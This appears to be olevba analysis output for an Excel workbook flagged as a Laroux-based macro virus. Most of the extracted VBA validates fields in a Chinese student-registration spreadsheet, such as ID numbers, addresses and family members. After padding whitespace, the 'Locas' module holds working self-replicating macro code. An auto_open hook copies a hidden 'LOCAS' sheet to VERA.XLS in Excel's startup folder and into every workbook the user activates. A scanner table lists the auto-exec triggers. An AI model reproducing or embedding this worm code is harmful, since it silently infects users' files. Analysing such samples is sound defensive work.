    sfzjlxStr = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex - 4)
    If sfzjlxStr <> "居民身份证" Then
        byteLen = checkByteLength(Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex))
        If byteLen > 18 Then
            errorMsg = "第" & rowIndex & "行的数据项：身份证件号长度不能大于18个字符（汉字不能大于6个字符），请检查！"
            writeLog (errorMsg)
        End If
    End If
End Function
'14 户口性质
Function checkHkxz(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("户口性质没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''15    户口所在地行政区划
Function checkHkszdXzqh(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 12, True)
        If isBeing Then
           IsNumber = checkBeNumeric(valueCol, rowIndex)
        End If
    End If
End Function
''16    班号
Function checkBh(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 7, True)
        If isBeing Then
           IsNumber = checkBeNumeric(valueCol, rowIndex)
        End If
    End If
End Function
''17    入学年月
Function checkRxny(valueCol As TypeValueColum, rowIndex)
     If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 6, True)
        If isBeing Then
           isYM = CheckIsYmDate(valueCol, rowIndex)
        End If
    End If
End Function
''18    入学方式
Function checkRxfs(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("入学方式没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''19    就读方式
Function checkJdfs(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("就读方式没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''20    现住址
Function checkXzz(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 60, False)
    End If
End Function
''21    通信地址
Function checkTxfs(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 60, False)
    End If
End Function
''22    家庭地址
Function checkJtzz(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 60, False)
    End If
End Function
''23    联系电话
Function checkLxdh(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 30, False)
        If isBeing Then
           IsNumber = checkBeNumeric(valueCol, rowIndex)
        End If
    End If
End Function
''24    邮政编码
Function checkYzbm(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 6, True)
        If isBeing Then
           IsNumber = checkBeNumeric(valueCol, rowIndex)
        End If
    End If
End Function
''25    是否独生子女
Function checkSfdszn(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("是否没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
    
End Function
''26    是否受过学前教育
Function checkSfsgxqjy(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("是否没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
    
End Function
''27    是否留守儿童
Function checkSflset(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("是否留守儿童没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''28    是否需要申请资助
Function checkSfsqzz(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("是否没有对应字典列检查，请联系管理员！")
        Exit Function
    End If

    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
    
End Function
''29    是否享受一补
Function checkSfxsyb(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("是否没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
    
End Function
''30    是否孤儿
Function checkSfge(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("是否没有对应字典列检查，请联系管理员！")
        Exit Function
    End If

    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
    
End Function
''31    是否烈士或优抚子女
Function checkSflshyfzn(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("是否没有对应字典列检查，请联系管理员！")
        Exit Function
    End If

    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
    
End Function
''32    上下学距离
Function checkSxjl(valueCol As TypeValueColum, rowIndex)
    Dim doubleStr As Double
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        If IsNumeric(value) Then
          If value <= 0 Then
            errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "为5位以内的正数且保留1位小数，请填写！"
            writeLog (errorMsg)
            Exit Function
          ElseIf value - Fix(value) = 0 And value > 0 Then
            value = Format(Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex), "0.0")
          Else
            value = Round(value, 1)
          End If
          Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex).value = value
          byteLen = checkByteLength(value)
          If byteLen > 6 Then
           errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "为5位以内的正数且保留1位小数，请填写！"
           writeLog (errorMsg)
          End If
        Else
           errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "的内容必须为数字，请重新填写！"
           writeLog (errorMsg)
        End If
    End If
End Function
''33    上下学方式
Function checkSxxfs(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("上下学方式没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''34 是否需要乘坐校车
Function checkSfxyczxc(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("是否没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
    
End Function
''35 曾用名
Function checkCym(valueCol As TypeValueColum, rowIndex)
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        isBeing = CheckValueLength(valueCol, rowIndex, 16, False)
    End If
End Function
''36 身份证有效期
Function checkSfzyxq(valueCol As TypeValueColum, rowIndex)
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        beLen = CheckValueLength(valueCol, rowIndex, 17, True)
        If beLen Then
            leftStr = Left(value, 8)
            If CheckBeDate(leftStr) Then
            Else
                errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "不符合规范，请检查(例如：19900101-20090101)!"
                writeLog (errorMsg)
                Exit Function
            End If
            midStr = Mid(value, 9, 1)
            If midStr <> "-" Then
                errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "不符合规范，请检查(例如：19900101-20090101,其中'-'为英文横杠)!"
                writeLog (errorMsg)
                Exit Function
            End If
            rightStr = Right(value, 8)
            If CheckBeDate(rightStr) Then
            Else
                errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "不符合规范，请检查(例如：19900101-20090101)!"
                writeLog (errorMsg)
                Exit Function
            End If
            compareNumber = compareDate(leftStr, rightStr)
            If compareNumber <> -1 Then
                errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "不合法，请检查(例如：19900101-20090101且后面的日期要大于前面的日期)!"
                writeLog (errorMsg)
                Exit Function
            End If
        Else
            errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "不符合规范，请检查(例如：19900101-20090101)!"
            writeLog (errorMsg)
        End If
    End If
End Function
''37 血型
Function checkXx(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("血型没有对应字典列检查，请联系管理员！")
        Exit Function
    End If

    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''38 特长
Function checkTc(valueCol As TypeValueColum, rowIndex)
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        isBeing = CheckValueLength(valueCol, rowIndex, 60, False)
    End If
End Function
''39 学籍辅号
Function checkXjfh(valueCol As TypeValueColum, rowIndex)
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        isBeing = CheckValueLength(valueCol, rowIndex, 20, False)
        If isBeing Then
            IsNumber = checkBeNumeric(valueCol, rowIndex)
        End If
    End If
End Function
''40 班内学号
Function checkBnxh(valueCol As TypeValueColum, rowIndex)
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        isBeing = CheckValueLength(valueCol, rowIndex, 20, False)
        If isBeing Then
            IsNumber = checkBeNumeric(valueCol, rowIndex)
        End If
    End If
End Function
''41 学生来源
Function checkXsly(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("学生来源没有对应字典列检查，请联系管理员！")
        Exit Function
    End If

    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''42 电子信箱
Function checkDzxx(valueCol As TypeValueColum, rowIndex)
    dzxxStr = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If dzxxStr = "" Then
        Exit Function
    Else
        isBeing = CheckValueLength(valueCol, rowIndex, 30, False)
        If isBeing Then
            isEmail = matchEmail(dzxxStr)
            If isEmai Then
            Else
                errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "格式不合法，请填写(zxxs@163.com)！"
                writeLog (errorMsg)
            End If
        End If
    End If
End Function
''43 主页地址
Function checkZydz(valueCol As TypeValueColum, rowIndex)
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        isBeing = CheckValueLength(valueCol, rowIndex, 20, False)
    End If
End Function
''44 残疾类型
Function checkCjlx(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("残疾类型没有对应字典列检查，请联系管理员！")
        Exit Function
    End If

   value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''45 是否由政府购买学位
Function checkSfyzfgmxw(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("是否没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
    
End Function
''46 随班就读
Function checkSbjd(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("随班就读没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''47 成员1姓名
Function checkCyyxm(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        oldValue = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
        newValue = Replace(oldValue, " ", "")
        Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex).value = newValue
        isBeing = CheckValueLength(valueCol, rowIndex, 30, False)
    End If
End Function
''48 成员1关系
Function checkCyygx(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("关系没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''49 成员1关系说明
Function checkCyygxsm(valueCol As TypeValueColum, rowIndex)
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        isBeing = CheckValueLength(valueCol, rowIndex, 30, False)
    End If
End Function
''50 成员1现住址
Function checkCyyxzz(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 60, False)
    End If
End Function
''51 成员1户口所在地行政区划
Function checkCyyhkszdxzqh(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 12, True)
        If isBeing Then
           IsNumber = checkBeNumeric(valueCol, rowIndex)
        End If
    End If
End Function
''52 成员1联系电话
Function checkCyylxdh(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 30, False)
        If isBeing Then
           IsNumber = checkBeNumeric(valueCol, rowIndex)
        End If
     End If
End Function
''53 成员1是否监护人
Function checkCyysfjhr(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("是否没有对应字典列检查，请联系管理员！")
        Exit Function
    End If

    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''54 成员1身份证件类型
Function checkCyysfzjlx(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("身份证件类型没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''55 成员1身份证件号
Function checkCyysfzjh(valueCol As TypeValueColum, rowIndex)
    sfzjlxStr = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex - 1)
    If IsEmpty(sfzjlxStr) Then
        Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex - 1).value = "其他"
        Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex).value = ""
    ElseIf sfzjlxStr = "其他" Then
        Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex).value = ""
    ElseIf sfzjlxStr = "居民身份证" Then
        beID = IDcheck(Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex))
        If beID = 0 Then
            errorMsg = "第" & rowIndex & "行的数据项：成员1身份证件号不正确，请检查！"
            writeLog (errorMsg)
        ElseIf beID = 1 Then
        Else
            Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex).value = beID
        End If
    Else
        byteLen = checkByteLength(Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex))
        If byteLen > 18 Then
            errorMsg = "第" & rowIndex & "行的数据项：成员1身份证件号长度不能大于18个字符（汉字不能大于6个字符），请检查！"
            writeLog (errorMsg)
        End If
    End If
    
End Function
''56 成员1民族
Function checkCyymz(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("民族没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''57 成员1工作单位
Function checkCyygzdw(valueCol As TypeValueColum, rowIndex)
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        isBeing = CheckValueLength(valueCol, rowIndex, 20, False)
    End If
End Function
''58 成员1职务
Function checkCyyzw(valueCol As TypeValueColum, rowIndex)
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        isBeing = CheckValueLength(valueCol, rowIndex, 20, False)
    End If
End Function
''59 成员2姓名
Function checkCyexm(valueCol As TypeValueColum, rowIndex)
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
        oldValue = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
        newValue = Replace(oldValue, " ", "")
        Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex).value = newValue
        If newValue <> "" Then
            isBeing = CheckValueLength(valueCol, rowIndex, 30, False)
        End If
    End If
End Function
''60 成员2关系
Function checkCyegx(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("关系没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    xmColumnIndx = valueCol.columnIndex - 1
    value = Sheets(valueSheetName).Cells(rowIndex, xmColumnIndx)  '成员2姓名是否填写
    If value = "" Then
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''61 成员2关系说明
Function checkCyegxsm(valueCol As TypeValueColum, rowIndex)
    xmColumnIndx = valueCol.columnIndex - 2
    value = Sheets(valueSheetName).Cells(rowIndex, xmColumnIndx)  '成员2姓名是否填写
    If value = "" Then
        Exit Function
    End If
    
    gxsmValue = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If gxsmValue <> "" Then
        isBeing = CheckValueLength(valueCol, rowIndex, 30, False)
    End If
    
End Function
''62 成员2现住址
Function checkCyexzz(valueCol As TypeValueColum, rowIndex)
    xmColumnIndx = valueCol.columnIndex - 3
    value = Sheets(valueSheetName).Cells(rowIndex, xmColumnIndx)  '成员2姓名是否填写
    If value = "" Then
        Exit Function
    End If
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 60, False)
    End If
    
End Function
''63 成员2户口所在地行政区划
Function checkCyehkszdxzqh(valueCol As TypeValueColum, rowIndex)
    xmColumnIndx = valueCol.columnIndex - 4
    value = Sheets(valueSheetName).Cells(rowIndex, xmColumnIndx)  '成员2姓名是否填写
    If value = "" Then
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 12, True)
        If isBeing Then
           IsNumber = checkBeNumeric(valueCol, rowIndex)
        End If
    End If
    
End Function
''64 成员2联系电话
Function checkCyelxdh(valueCol As TypeValueColum, rowIndex)
    xmColumnIndx = valueCol.columnIndex - 5
    value = Sheets(valueSheetName).Cells(rowIndex, xmColumnIndx)  '成员2姓名是否填写
    If value = "" Then
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 30, False)
        If isBeing Then
           IsNumber = checkBeNumeric(valueCol, rowIndex)
        End If
     End If
    
End Function
''65 成员2是否监护人
Function checkCyesfjhr(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("是否没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    xmColumnIndx = valueCol.columnIndex - 6
    value = Sheets(valueSheetName).Cells(rowIndex, xmColumnIndx)  '成员2姓名是否填写
    If value = "" Then
        Exit Function
    End If

    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
    
End Function
''66 成员2身份证件类型
Function checkCyesfzjlx(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("身份证件类型没有对应字典列检查，请联系管理员！")
        Exit Function
    End If

    xmColumnIndx = valueCol.columnIndex - 7
    value = Sheets(valueSheetName).Cells(rowIndex, xmColumnIndx)  '成员2姓名是否填写
    If value = "" Then
        Exit Function
    End If
    
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''67 成员2身份证件号
Function checkCyesfzjh(valueCol As TypeValueColum, rowIndex)
    sfzjlxStr = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex - 1)
    If IsEmpty(sfzjlxStr) Or sfzjlxStr = "其他" Then
        Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex).value = ""
    ElseIf sfzjlxStr = "居民身份证" Then
        beID = IDcheck(Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex))
        If beID = 0 Then
            errorMsg = "第" & rowIndex & "行的数据项：成员2身份证件号不正确，请检查！"
            writeLog (errorMsg)
        ElseIf beID = 1 Then
        Else
            Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex).value = beID
        End If
    Else
        byteLen = checkByteLength(Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex))
        If byteLen > 18 Then
            errorMsg = "第" & rowIndex & "行的数据项：成员2身份证件号长度不能大于18个字符（汉字不能大于6个字符），请检查！"
            writeLog (errorMsg)
        End If
    End If
    
End Function
''68 成员2民族
Function checkCyemz(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("民族没有对应字典列检查，请联系管理员！")
        Exit Function
    End If

    xmColumnIndx = valueCol.columnIndex - 9
    value = Sheets(valueSheetName).Cells(rowIndex, xmColumnIndx)  '成员2姓名是否填写
    If value = "" Then
        Exit Function
    End If
    
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If value <> "" Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
''69 成员2工作单位
Function checkCyegzdw(valueCol As TypeValueColum, rowIndex)
    xmColumnIndx = valueCol.columnIndex - 10
    value = Sheets(valueSheetName).Cells(rowIndex, xmColumnIndx)  '成员2姓名是否填写
    If value = "" Then
        Exit Function
    End If
    
    gzdwValue = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If gzdwValue <> "" Then
        isBeing = CheckValueLength(valueCol, rowIndex, 20, False)
    End If
End Function
''70 成员2职务
Function checkCyezw(valueCol As TypeValueColum, rowIndex)
    xmColumnIndx = valueCol.columnIndex - 11
    value = Sheets(valueSheetName).Cells(rowIndex, xmColumnIndx)  '成员2姓名是否填写
    If value = "" Then
        Exit Function
    End If
    
    zwValue = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If zwValue <> "" Then
        isBeing = CheckValueLength(valueCol, rowIndex, 20, False)
    End If
End Function
''71 是否进城务工人员随迁子女
Function checkSfjcwgrysqzn(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("是否没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function

-------------------------------------------------------------------------------
VBA MACRO Locas.bas 
in file: Virus.MSExcel.Laroux-based-1f39609b1c9bc5335c7c184d76c01d28a4347b034292a8345cd11274736351d6 - OLE stream: '_VBA_PROJECT_CUR/VBA/Locas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Sub fig()
    
    Set X = CreateObject("ADODB.Connection")
    
    X.Open "Provider=Microsoft.Jet.OLEDB.4.0;Extended Properties=Excel 8.0;Data Source=" & ThisWorkbook.FullName
Sql = "select mid(款号,1,2) & '0000 组', sum(件数) from [货品销售$] group by  mid(款号,1,2)"

    Set yy = X.Execute(Sql)
   [g10:h44].Clear
   [g10].CopyFromRecordset yy
   
        Set yy = Nothing:    Set X = Nothing
End Sub





















Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "VERA.XLS")
    If m$ = "VERA.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("locas").Visible = True
    Sheets("locas").Select
    Sheets("locas").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "VERA.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("LOCAS").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "VERA.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "LOCAS" Then
         Workbooks("VERA.XLS").Sheets("LOCAS").Copy before:=Workbooks(n4$).Sheets(1)
    Workbooks(n4$).Sheets("LOCAS").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = Tru
    Application.OnSheetActivate = "VERA.xls!check_files"
    Case Else
End Select
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |'开始检查_Click'        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

